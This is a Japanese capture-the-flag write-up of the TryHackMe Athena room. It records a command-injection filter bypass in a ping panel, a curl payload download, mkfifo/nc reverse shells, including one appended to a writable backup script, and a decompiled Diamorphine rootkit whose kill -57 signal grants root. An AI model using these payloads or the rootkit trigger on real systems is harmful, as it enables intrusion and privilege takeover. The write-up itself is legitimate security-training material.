# Athena CTF

https://tryhackme.com/room/4th3n4

## Enumeration

```shell
TARGET=10.201.85.94
sudo bash -c "echo $TARGET   athena.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

```sh
sudo nmap -sS -sV -p22,80,139,445 $TARGET

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
```

SSH, HTTP, SMB

### ディレクトリ列挙

トップページのリンクは全てダミー。

```sh
dirb http://$TARGET
```

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -q -x=txt,php -u http://athena.thm -w ./dirlist.txt -t 64 -k
```

ディレクトリ列挙では何も出なかった。

トップページのヘッダーに、`matheuz` という名前を発見。

```html
  <head>
    ...
    <meta name="author" content="matheuz">
    ...
  </head>
```

### SMB

無名ではログインできない。

```sh
$ smbclient -L //$TARGET -U "" 
Password for [WORKGROUP\]:
session setup failed: NT_STATUS_LOGON_FAILURE
```

enum4linux を実行すると、public フォルダが見えた。

```sh
$ enum4linux -S $TARGET
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Nov  7 10:16:35 2025

 =========================================( Target Information )=========================================
                                                                                                                                                                                                                                          
Target ........... 10.201.85.94                                                                                                                                                                                                           
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.201.85.94 )============================
                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                          
[+] Got domain/workgroup name: SAMBA                                                                                                                                                                                                      
                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                          
 ===================================( Session Check on 10.201.85.94 )===================================
                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                          
[+] Server 10.201.85.94 allows sessions using username '', password ''                                                                                                                                                                    
                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                          
 ================================( Getting domain SID for 10.201.85.94 )================================
                                                                                                                                                                                                                                          
Domain Name: SAMBA                                                                                                                                                                                                                        
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                                                                                                                                      
                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                          
 =================================( Share Enumeration on 10.201.85.94 )=================================
                                                                                                                                                                                                                                          
smbXcli_negprot_smb1_done: No compatible protocol selected by server.                                                                                                                                                                     

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      
        IPC$            IPC       IPC Service (Samba 4.15.13-Ubuntu)
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 10.201.85.94 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.201.85.94                                                                                                                                                                                              
                                                                                                                                                                                                                                          
//10.201.85.94/public   Mapping: OK Listing: OK Writing: N/A                                                                                                                                                                              

[E] Can't understand response:                                                                                                                                                                                                            
                                                                                                                                                                                                                                          
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                                                                                                
//10.201.85.94/IPC$     Mapping: N/A Listing: N/A Writing: N/A
enum4linux complete on Fri Nov  7 10:16:57 2025
```

無名ログインではなく、パスワードなしログインなら接続できた。

```sh
$ smbclient -L //$TARGET -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      
        IPC$            IPC       IPC Service (Samba 4.15.13-Ubuntu)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 10.201.85.94 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

```sh
smb: \> ls
  .                                   D        0  Mon Apr 17 09:54:43 2023
  ..                                  D        0  Mon Apr 17 09:54:05 2023
  msg_for_administrator.txt           N      253  Mon Apr 17 03:59:44 2023
```

/myrouterpanel にPingシステムがあることが判明。

```sh
$ cat ./msg_for_administrator.txt 

Dear Administrator,

I would like to inform you that a new Ping system is being developed and I left the corresponding application in a specific path, which can be accessed through the following address: /myrouterpanel

Yours sincerely,

Athena
Intern
```

## /myrouterpanel

IPアドレスを入力すると、下記のリクエストが送信される。

```http
POST /myrouterpanel/ping.php HTTP/1.1
Host: athena.thm
Content-Length: 23
Cache-Control: max-age=0
Origin: http://athena.thm
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://athena.thm/myrouterpanel/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8
Connection: keep-alive

ip=10.11.146.32&submit=
```

セミコロンによるコマンドインジェクションを試すと、ハッキングが検出された。

```
ip=10.11.146.32;id&submit=
```

```
Attempt hacking!
```

`%0A` を使うことで回避できた。

```
ip=10.11.146.32%0Aid&submit=
```

```
<pre>PING 10.11.146.32 (10.11.146.32) 56(84) bytes of data.
64 bytes from 10.11.146.32: icmp_seq=1 ttl=61 time=337 ms
64 bytes from 10.11.146.32: icmp_seq=2 ttl=61 time=336 ms
64 bytes from 10.11.146.32: icmp_seq=3 ttl=61 time=367 ms
64 bytes from 10.11.146.32: icmp_seq=4 ttl=61 time=337 ms

--- 10.11.146.32 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3003ms
rtt min/avg/max/mdev = 336.485/344.406/367.219/13.175 ms
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```

curlでシェルをダウンロードさせてから実行。

```
curl http://10.11.146.32:8000/test.sh -o /tmp/test.sh
```

```
ip=10.11.146.32%0Abash /tmp/test.sh&submit=
```

リバースシェル取得成功。

```sh
$ nc -lnvp 8888                   
listening on [any] 8888 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.85.94] 46418
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

## 権限昇格１

athena への昇格を目指す。

```sh
www-data@routerpanel:/var/www/html/myrouterpanel$ ls -al /home
total 16
drwxr-xr-x  4 root   root   4096 Apr 16  2023 .
drwxr-xr-x 20 root   root   4096 Apr 16  2023 ..
drwx------ 17 athena athena 4096 Jul 31  2023 athena
drwx------ 15 ubuntu ubuntu 4096 May 23  2023 ubuntu
```

www-dataオーナー、athenaグループのファイルを発見。

```sh
www-data@routerpanel:/var/www/html/myrouterpanel$ find / -group athena -type f -not -path "/proc/*" 2>/dev/null
/usr/share/backup/backup.sh

www-data@routerpanel:/var/www/html/myrouterpanel$ ls -al /usr/share/backup/backup.sh
-rwxr-xr-x 1 www-data athena 258 May 28  2023 /usr/share/backup/backup.sh
```

バックアップシェル。

```sh
www-data@routerpanel:/var/www/html/myrouterpanel$ cat /usr/share/backup/backup.sh
#!/bin/bash

backup_dir_zip=~/backup

mkdir -p "$backup_dir_zip"

cp -r /home/athena/notes/* "$backup_dir_zip"

zip -r "$backup_dir_zip/notes_backup.zip" "$backup_dir_zip"

rm /home/athena/backup/*.txt
rm /home/athena/backup/*.sh

echo "Backup completed..."
```

編集可能なので、単刀直入にリバースシェルを追加。

```sh
www-data@routerpanel:/var/www/html/myrouterpanel$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.146.32 8889 >/tmp/f' >> /usr/share/backup/backup.sh
```

athenaに昇格成功。SSH秘密鍵があったが、パスワードが必要なためSSH接続は不可。


```sh
$ nc -lnvp 8889                   
listening on [any] 8889 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.85.94] 46426
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(athena) gid=1001(athena) groups=1001(athena)
```

## 権限昇格２

### notes

notesディレクトリで2つのノートを発見したが、昇格の決定的な情報は無かった。

### sudo

insmod はカーネルにモジュールをインサートする機能。

```sh
athena@routerpanel:~/notes$ sudo -l
Matching Defaults entries for athena on routerpanel:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User athena may run the following commands on routerpanel:
    (root) NOPASSWD: /usr/sbin/insmod /mnt/.../secret/venom.ko
```

指定のパスにファイルが存在していた。

```sh
athena@routerpanel:~/notes$ ls -al /mnt/.../secret
total 504
drwxr-xr-x 2 root root   4096 Apr 17  2023 .
drwxr-xr-x 3 root root   4096 Apr 17  2023 ..
-rw-r--r-- 1 root root 504616 Apr 17  2023 venom.ko
```

ghidraでリバースすると、下記関数がエクスポートされていた。

- find_task
- get_syscall_table_bf
- give_root
- hacked_kill
- is_invisible
- module_hide
- module_show

また、diamorphine_init 関数が実装されている。

### Diamorphine

https://github.com/m0nad/Diamorphine

```
Diamorphine は、Linux カーネル 2.6.x/3.x/4.x/5.x/6.x (x86/x86_64 および ARM64) 用の LKM ルートキットです。
```

```
ロードされると、モジュールは非表示で起動します。
シグナル 31 を送信して任意のプロセスを非表示/表示します。
シグナル 63 を (任意の pid に) 送信すると、モジュールが可視または非可視になります。
シグナル 64 (任意の pid に) を送信すると、指定されたユーザーが root になります。
MAGIC_PREFIX で始まるファイルまたはディレクトリは非表示になります。
```

シグナル64を送信したらシェルがフリーズした。

```sh
athena@routerpanel:/$ kill -64 0
```

diamorphine_init の実装

```c
int diamorphine_init(void)
{
  long lVar1;
  ulong *puVar2;
  int iVar3;
  long in_GS_OFFSET;
  ulong __force_order;
  
  lVar1 = *(long *)(in_GS_OFFSET + 0x28);
  __sys_call_table = get_syscall_table_bf();
  iVar3 = -1;
  if (__sys_call_table != (ulong *)0x0) {
    cr0 = (*_commit_creds)();
    module_hidden = 1;
    (__this_module.list.next)->prev = __this_module.list.prev;
    (__this_module.list.prev)->next = __this_module.list.next;
    module_previous = __this_module.list.prev;
    __this_module.list.next = (list_head *)0xdead000000000100;
    __this_module.list.prev = (list_head *)0xdead000000000122;
    kfree(__this_module.sect_attrs);
    puVar2 = __sys_call_table;
    __this_module.sect_attrs = (module_sect_attrs *)0x0;
    orig_getdents = (t_syscall)__sys_call_table[0x4e];
    orig_getdents64 = (t_syscall)__sys_call_table[0xd9];
    orig_kill = (t_syscall)__sys_call_table[0x3e];
    __sys_call_table[0x4e] = (ulong)hacked_getdents;
    puVar2[0xd9] = (ulong)hacked_getdents64;
    puVar2[0x3e] = (ulong)hacked_kill;
    iVar3 = 0;
  }
  if (lVar1 != *(long *)(in_GS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return iVar3;
}
```

システムコール0x3e=62 を、hacked_kill で置き換えている。

hacked_killの実装

```c
int hacked_kill(pt_regs *pt_regs)
{
  undefined1 *puVar1;
  list_head *plVar2;
  int iVar3;
  long lVar4;
  undefined *puVar5;
  
  plVar2 = module_previous;
  iVar3 = (int)pt_regs->si;
  if (iVar3 == 0x39) {
    give_root();
    return 0;
  }
  if (iVar3 == 0x3f) {
    if (module_hidden == 0) {
      module_previous = __this_module.list.prev;
      (__this_module.list.next)->prev = __this_module.list.prev;
      (__this_module.list.prev)->next = __this_module.list.next;
      __this_module.list.next = (list_head *)0xdead000000000100;
      __this_module.list.prev = (list_head *)0xdead000000000122;
      module_hidden = 1;
      return 0;
    }
    __this_module.list.next = module_previous->next;
    (__this_module.list.next)->prev = &__this_module.list;
    __this_module.list.prev = plVar2;
    module_hidden = 0;
    plVar2->next = (list_head *)0x101008;
    return 0;
  }
  if (iVar3 != 0x1f) {
    lVar4 = (*orig_kill)(pt_regs);
    return (int)lVar4;
  }
  puVar5 = &init_task;
  do {
    puVar1 = *(undefined1 **)(puVar5 + 0x848);
    puVar5 = puVar1 + -0x848;
    if (puVar1 == &DAT_00102880) {
      return -3;
    }
  } while ((int)pt_regs->di != *(int *)(puVar1 + 0x108));
  if (puVar5 == (undefined *)0x0) {
    return -3;
  }
  *(uint *)(puVar1 + -0x81c) = *(uint *)(puVar1 + -0x81c) ^ 0x10000000;
  return 0;
}
```

iVar3 == 0x39 =57 で、give_root が実行される。[システムコール 62 の定義](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/) によると、iVar3 はシグナルの値。

```
62	sys_kill	pid_t pid	int sig
```

まとめると、give_root をトリガーするには次のコマンドになる。PIDは何でもよい。

```sh
athena@routerpanel:/$ kill -57 0
kill -57 0
athena@routerpanel:/$ id
id
uid=0(root) gid=0(root) groups=0(root),1001(athena)
```

## 振り返り

- smbclient の無名ログインとパスワードなしログインの違いを知らなかったので良い学びだった。
- Diamorphine も、ルートキットの仕組みが（少なくとも表面的には）理解できて良い勉強になった。
